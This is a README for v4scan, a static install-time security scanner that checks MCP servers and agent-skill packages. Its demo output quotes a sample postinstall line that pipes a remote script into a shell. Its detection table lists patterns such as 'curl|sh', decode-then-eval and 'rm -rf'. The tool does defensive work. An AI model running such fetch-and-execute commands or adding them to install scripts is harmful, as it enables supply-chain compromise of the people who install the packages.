# v4scan

> **Scan MCP servers and AI-agent skill packages before you install them.**

**v4scan is a deterministic install-time security scanner that detects suspicious install scripts, typosquats, obfuscation, network activity and provenance problems before the package executes.**

It reads a package's install scripts, manifest, and source *before* `npm install` / `pip install` runs —
and tells you, with **no model in the loop**, whether something risky is about to execute.

```bash
v4scan ./my-mcp-server --explain      # human-readable verdict + reasons
v4scan . --sarif                      # SARIF 2.1.0 for CI / GRC tooling
```

---

## 30-second demo (real output)

A package whose `postinstall` pipes a remote script straight into a shell:

```bash
$ v4scan examples/01-postinstall-curl-sh --explain
```

```
[HIGH] install-script-execution — risky token 'curl' in script 'postinstall'
  Package executes external/unsafe commands during install. This is the primary supply-chain attack vector.
  evidence: curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh

[MEDIUM] network-egress-at-install — network egress token 'https://' in script 'postinstall'
[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
[LOW]    thin-metadata — no repository/license metadata present

$ echo $?
1
```

**Exit code 1 = the build is blocked.** Full walkthrough in [`DEMO.md`](./DEMO.md).

---

## Who this is for

- **AI/LLM platform engineers** pulling MCP servers and agent-skill packages into internal tooling
- **DevOps / CI-CD engineers** who own the build pipeline
- **Platform engineers** and **Heads of Platform / VP Engineering**

v4scan is deliberately usable by the engineer who already owns the pipeline — **without** a CISO,
a security team, a procurement cycle, or a security review. It is a developer tool first.

---

## What it catches

| Signal | Severity | Catches |
|--------|----------|---------|
| `V4-INSTALL-EXEC` | **High** | Risky commands run during `preinstall`/`install`/`postinstall` (`curl\|sh`, `eval`, `base64`, `rm -rf`, `npm i`, …) |
| `V4-TYPOSQUAT`    | **High** | Package name within edit-distance 1–2 of a popular package |
| `V4-OBF-EVAL`     | **High** | Decode-**then**-execute only: `eval(atob(...))`, `eval(base64...)`, `new Function(atob...)` / `new Function(base64...)` |
| `V4-OBF-DECODE`   | Low | Benign decode primitives used alone (`atob(`, `buffer.from(`, `base64.b64decode`, `new Function(`). Informational — does **not** gate CI |
| `V4-NET-EGRESS`   | Medium | Network calls during install (exfiltration / second-stage pull) |
| `V4-OBF-ENTROPY`  | Medium | High-Shannon-entropy blocks (packed/encoded payloads), first-party code only |
| `V4-OBF-B64`      | Medium | Long base64-style runs, first-party code only |
| `V4-NO-PROVENANCE`| Medium | No SLSA / sigstore / in-toto attestation present |
| `V4-THIN-META`    | Low | Manifest missing `repository` / `license` |

**Exit codes:** `1` on any High/Critical finding (blocks CI), `0` otherwise.

---

## Why "deterministic"?

The block / allow decision is **fully auditable and reproducible**: the same input always yields the
same verdict. No model guesses. Every block is explainable — here is the script it ran, here is the
entropy score, here is the typosquat distance.

That matters when something malicious executes at install time: you need to be able to prove *why*
you caught it (or missed it), not argue about a model's output.

---

## Install / build

```bash
cargo build --release          # or: cargo install --path .
```

On a box without the MSVC linker (some CI/sandbox images), use the gnu toolchain + MinGW gcc:

```bash
cargo +stable-x86_64-pc-windows-gnu build --release
```

---

## Wire it into CI / pre-commit

- **GitHub Action:** `.github/workflows/v4-scan.yml` — scans on every PR/push, uploads the SARIF
  report, and fails the build on any High/Critical.
- **pre-commit:** `.pre-commit-hooks.yaml` — add this repo as a hook to scan before commit.

---

## Examples

See [`examples/`](./examples) — six packages and exactly what v4scan reports for each, including
the marquee `postinstall → curl | sh` case, a typosquat, decode-then-execute, install-time
exfiltration, and two benign packages that correctly **do not** block.

Reproduce any of them:

```bash
for d in examples/*/; do echo "== $d =="; v4scan "$d" --explain; echo "exit=$?"; done
```

---

## Limitations (what this is NOT)

- A **first-pass static heuristic**, not a substitute for `npm audit`, `pip-audit`, Sigstore
  verification, or a runtime sandbox. It does **not** execute anything — it reads files and reports.
- Thresholds (entropy `> 4.6`, base64 run `>= 24`) are starting points, tuned against ~170 real
  packages to drive false positives down.
- Coverage is intentionally narrow: **MCP servers and AI-agent skill packages first**, not the whole
  of npm/PyPI.
- SARIF output now carries `rules` metadata, so every `ruleId` resolves to a name, a full
  description, and a default level in consumers such as GitHub code scanning.

---

`v4scan` is the validation instrument for the **V4 hypothesis**: an install-time firewall for the
MCP / AI-agent-skill ecosystem that is cheap to run, deterministic, and forwardable into existing
security tooling.
